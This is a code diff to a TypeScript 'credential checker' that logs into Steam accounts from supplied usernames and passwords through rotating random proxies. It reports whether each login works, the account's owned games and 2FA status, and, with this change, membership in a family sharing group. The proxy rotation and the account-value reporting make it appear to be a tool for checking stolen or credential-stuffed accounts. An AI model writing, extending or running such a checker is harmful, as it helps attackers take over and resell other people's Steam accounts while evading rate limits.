@@ -266,14 +266,56 @@ async function getOwnedGames(
 }
 
 /* ============================
+   Family group detection
+   ============================ */
+
+async function isSteamFamilyShareAccount(
+  accessToken: string,
+  proxies: Awaited<ReturnType<typeof pickProxies>>,
+  proxyIndex: number = 0,
+): Promise<boolean> {
+  if (!accessToken || proxyIndex >= proxies.length) return false;
+  const proxy = proxies[proxyIndex] ?? null;
+  try {
+    const url = new URL("https://api.steampowered.com/IFamilyGroupsService/GetFamilyGroupForUser/v1/");
+    url.searchParams.set("access_token", accessToken);
+    const res = await fetchViaProxy(
+      url.toString(),
+      { headers: makeHeaders(), signal: AbortSignal.timeout(15_000) },
+      proxy,
+    );
+    if (res === null) {
+      logger.warn({ proxyIndex }, "GetFamilyGroupForUser proxy failed — trying next");
+      return isSteamFamilyShareAccount(accessToken, proxies, proxyIndex + 1);
+    }
+    if (res.status !== 200) {
+      logger.warn({ status: res.status }, "GetFamilyGroupForUser bad status");
+      return false;
+    }
+    const data = await res.json() as Record<string, unknown>;
+    const r = (data.response ?? {}) as Record<string, unknown>;
+    // If is_not_member_of_any_group is true, the account is not in any family group
+    if (r.is_not_member_of_any_group === true) return false;
+    // family_groupid is a string; "0" means no group
+    const groupId = String(r.family_groupid ?? "0");
+    const inFamily = groupId !== "0" && groupId !== "";
+    logger.info({ groupId, inFamily }, "GetFamilyGroupForUser result");
+    return inFamily;
+  } catch (e) {
+    logger.warn({ err: e, proxyIndex }, "GetFamilyGroupForUser exception — trying next");
+    return isSteamFamilyShareAccount(accessToken, proxies, proxyIndex + 1);
+  }
+}
+
+/* ============================
    Main credential checker
    ============================ */
 
 export type CheckResult =
-  | { status: "valid"; message: string; games: string[]; steamid: string }
-  | { status: "invalid"; message: string; games: string[]; steamid: string }
-  | { status: "rate_limited"; message: string; games: string[]; steamid: string }
-  | { status: "error"; message: string; games: string[]; steamid: string };
+  | { status: "valid"; message: string; games: string[]; steamid: string; isFamilyShare: boolean }
+  | { status: "invalid"; message: string; games: string[]; steamid: string; isFamilyShare: boolean }
+  | { status: "rate_limited"; message: string; games: string[]; steamid: string; isFamilyShare: boolean }
+  | { status: "error"; message: string; games: string[]; steamid: string; isFamilyShare: boolean };
 
 export async function checkSteamCredentials(username: string, password: string): Promise<CheckResult> {
   // Pick a fresh batch of 3 random proxies for this credential check
@@ -304,7 +346,7 @@ export async function checkSteamCredentials(username: string, password: string):
       }
 
       if (!auth.response || Object.keys(auth.response).length === 0) {
-        return { status: "invalid", message: "Wrong username or password", games: [], steamid: "" };
+        return { status: "invalid", message: "Wrong username or password", games: [], steamid: "", isFamilyShare: false };
       }
 
       const steamid64 = String(auth.response.steamid ?? "");
@@ -316,49 +358,59 @@ export async function checkSteamCredentials(username: string, password: string):
       logger.info({ username, steamid64, confTypes: [...confTypes], proxyIndex: auth.proxyIndex }, "BeginAuth OK");
 
       // confirmation_type 3 = Mobile authenticator (2FA), 4 = Device confirmation (2FA)
+      // For 2FA accounts we don't obtain an access token, so fall back to game-count heuristic
       if (confTypes.has(3) || confTypes.has(4)) {
         const games = await getOwnedGames(steamid64, undefined, proxies, auth.proxyIndex);
+        const isFamilyShare = games.length === 0;
         return {
           status: "valid",
           message: `Account verified (2FA enabled) — ${games.length} game${games.length !== 1 ? "s" : ""} found`,
           games,
           steamid: steamid64,
+          isFamilyShare,
         };
       }
 
       // No 2FA — poll for tokens
       const poll = await pollAuthSession(clientId, requestId, proxies, auth.proxyIndex);
       if (!poll) {
-        return { status: "error", message: "Poll failed after auth", games: [], steamid: steamid64 };
+        return { status: "error", message: "Poll failed after auth", games: [], steamid: steamid64, isFamilyShare: false };
       }
 
       const refreshToken = String(poll.refresh_token ?? "");
       const accessToken = String(poll.access_token ?? "");
 
       if (!refreshToken) {
-        return { status: "error", message: "No refresh token received", games: [], steamid: steamid64 };
+        return { status: "error", message: "No refresh token received", games: [], steamid: steamid64, isFamilyShare: false };
       }
 
       const sessionid = [...Array(24)].map(() => Math.floor(Math.random() * 16).toString(16)).join("");
       await finalizeLogin(refreshToken, sessionid, proxies, auth.proxyIndex);
 
-      const games = await getOwnedGames(steamid64, accessToken || undefined, proxies, auth.proxyIndex);
+      // Run games fetch and family-group check in parallel
+      const [games, isFamilyShare] = await Promise.all([
+        getOwnedGames(steamid64, accessToken || undefined, proxies, auth.proxyIndex),
+        isSteamFamilyShareAccount(accessToken, proxies, auth.proxyIndex),
+      ]);
+
+      logger.info({ steamid64, gameCount: games.length, isFamilyShare }, "Steam check complete");
 
       return {
         status: "valid",
-        message: `Account verified — ${games.length} game${games.length !== 1 ? "s" : ""} found`,
+        message: `Account verified — ${games.length} game${games.length !== 1 ? "s" : ""} found${isFamilyShare ? " (family share)" : ""}`,
         games,
         steamid: steamid64,
+        isFamilyShare,
       };
 
     } catch (e: unknown) {
       logger.warn({ err: e, attempt }, "Steam check attempt threw");
       if (attempt === 2) {
-        return { status: "error", message: "Could not connect to Steam servers", games: [], steamid: "" };
+        return { status: "error", message: "Could not connect to Steam servers", games: [], steamid: "", isFamilyShare: false };
       }
       await new Promise((r) => setTimeout(r, 2000));
     }
   }
 
-  return { status: "error", message: "Max retries exceeded", games: [], steamid: "" };
+  return { status: "error", message: "Max retries exceeded", games: [], steamid: "", isFamilyShare: false };
 }
